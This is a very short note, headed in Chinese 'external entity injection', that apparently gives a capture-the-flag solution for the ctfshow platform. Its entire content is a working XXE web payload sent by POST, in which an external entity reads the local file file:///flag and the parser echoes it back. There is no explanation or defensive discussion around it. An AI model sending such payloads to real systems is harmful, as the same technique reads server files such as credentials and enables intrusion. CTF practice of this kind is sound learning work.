
外部实体注入
```
[POST]Payload:

<?xml version="1.0"?>
<!DOCTYPE payload [
<!ELEMENT payload ANY>
<!ENTITY xxe SYSTEM "file:///flag">
]>
<creds>
<ctfshow>&xxe;</ctfshow>
</creds>
```